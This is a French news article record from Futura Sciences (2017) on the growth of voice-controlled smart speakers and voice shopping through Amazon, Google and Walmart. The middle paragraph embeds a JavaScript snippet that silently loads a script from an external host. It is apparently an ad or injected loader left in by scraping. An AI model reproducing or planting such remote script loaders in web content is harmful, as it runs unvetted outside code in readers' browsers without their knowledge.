{"title": "Enceinte connectee : les experts lui predisent un gros succes", "newspaper": "Futura Sciences", "author": ["Jean-Luc Goudet"], "date_publi": "2017-09-04", "content": "Echo d'Amazon, Google Home ou HomePod d'Apple : les enceintes connectees, qui repondent a la voix, representeront bientot un marche gigantesque, affirment des cabinets d'etude americains. Commander une pizza depuis son canape, sans meme devoir se lever, serait bien plus  << sexy >> . Certains, tout de meme, rappellent qu'en faisant ainsi ses courses, le client est totalement captif d'une seule chaine de magasins... Rester dans son canape pour acheter des yaourts ou une pizza, sans meme avoir besoin d'un  ordinateur , est desormais possible grace a la multiplication des  enceintes connectees  repondant a la voix, derniere illustration des nouvelles facons de faire les courses grace a la technologie. Selon le cabinet Gartner, le marche des  enceintes connectees  a commande vocale representera 2,96 milliards d'euros en 2021 dans le monde, contre 303 millions en 2015. Ces haut-parleurs intelligents permettent deja de passer sa chanson preferee (mais pas depuis n'importe quelle bibliotheque de musiques) ou de regler son chauffage. Ils commencent a servir aussi a faire les courses. Meme s'il est difficile d'evaluer la proportion actuelle des consommateurs qui les utilisent pour commander en ligne, les analystes du secteur s'accordent a dire que cette facon de consommer va croitre avec le temps. Pour l'instant, malgre le succes des enceintes connectees, c'est encore  << une activite de precurseurs >> , car  << les consommateurs n'ont pas encore assez confiance dans la technologie >> , estime Carolina Milanesi, de Creative Strategies. Et la  commande vocale  se limite  << aux produits simples et faciles a commander >> , comme des bouteilles de soda, observe-t-elle.  << Pour des produits plus chers, comme un  aspirateur , ou qui demandent de choisir une taille ou une  couleur , mieux vaut avoir le choix sous les  yeux . >> \" C'est humain de vouloir avoir le maximum en faisant un minimum d'efforts... Pour autant, pense Carolina Milanesi,  << comme nous sommes de moins en moins devant nos ordinateurs, la possibilite de commander par la voix seduit certainement >>  de plus en plus, surtout avec les progres de l' intelligence artificielle .  << Si je peux commander une  pizza , plutot que de me deplacer, de prendre mon telephone ou d'ouvrir une  application , je le fais >> , poursuit Carolina Milanesi, estimant que c'est  << plus sexy >> ,  << plus rapide >>  et  << plus pratique >> .  << C'est humain de vouloir avoir le maximum en faisant un  minimum d'efforts ... >> , dit-elle encore.  << Il y aura une croissance continue dans le secteur du shopping par la voix >> , abonde Jack Gold, de J. Gold Associates. L'enceinte connectee Google Home. Elle prend les commandes, a condition que ce soit chez Wal-Mart. (c) Google                               Le shopping vocal sera captif Les distributeurs et les geants technologiques l'ont bien compris, a commencer par Amazon. Le geant du commerce en ligne s'est lance des 2014 avec Echo, qui, selon les cabinets specialises s'est deja au moins vendu a plusieurs millions d'exemplaires. Il permet, entre autres, de commander directement sur Amazon via l' assistant vocal  Alexa. Selon le cabinet eMarketer, Amazon domine largement le secteur des haut-parleurs intelligents, avec 70 % de parts de marche aux Etats-Unis suivi de  Google Home , avec environ 24 %. Et en rachetant recemment les supermarches bio Whole Foods, Amazon permet aux detenteurs d'Echo de commander directement des produits de l'enseigne, augmentant d'autant son portefeuille de clients. Amazon vient aussi d'annoncer qu'Alexa serait compatible avec l'assistant vocal de Microsoft,  Cortana  .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Preuve de l'engouement des entreprises, Apple s'est lance recemment dans les enceintes connectees avec son  HomePod , controle par l'assistant vocal  Siri , tandis que le sud-coreen Samsung prevoit lui aussi de lancer un modele. Face au rouleau compresseur Amazon, le geant de la distribution Wal-Mart et  Google  ont recemment annonce un partenariat. Via leur Google Home, les clients pourront desormais commander et se faire livrer des  << centaines de milliers >>  de produits Wal-Mart. Pour les entreprises,  << c'est un bon moyen de s'assurer de la fidelite des clients >> , explique Jack Gold. Le shopping vocal  << est dans la continuite de la strategie  Web  des entreprises, c'est une nouvelle  porte  d'entree vers leur  ecosysteme  >>  commercial, juge l'analyste. Pour Colin Sebastian, de la firme Baird, le shopping vocal va  << prendre une part de plus en plus importante dans les revenus de Google a long terme, au fur et a mesure que les recherches migrent vers les plateformes vocales et ou les transactions prennent la place de la publicite >> . Mais, nuance Jack Gold, si  << c'est bon pour les entreprises >> , ca ne l'est pas forcement pour les clients qui, du coup, selon le systeme utilise, commandent par defaut via Amazon ou Google Express, le supermarche en ligne du geant technologique. Les autres innovations technologiques en  matiere  de consommation sont nombreuses, comme les livraisons par  drones  testees par Amazon. Le geant de la pizza Domino's teste aussi des  livraisons par drone  ou par  voiture autonome  en collaboration avec le constructeur  automobile  Ford. Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  gros bec", "theme": "tech"}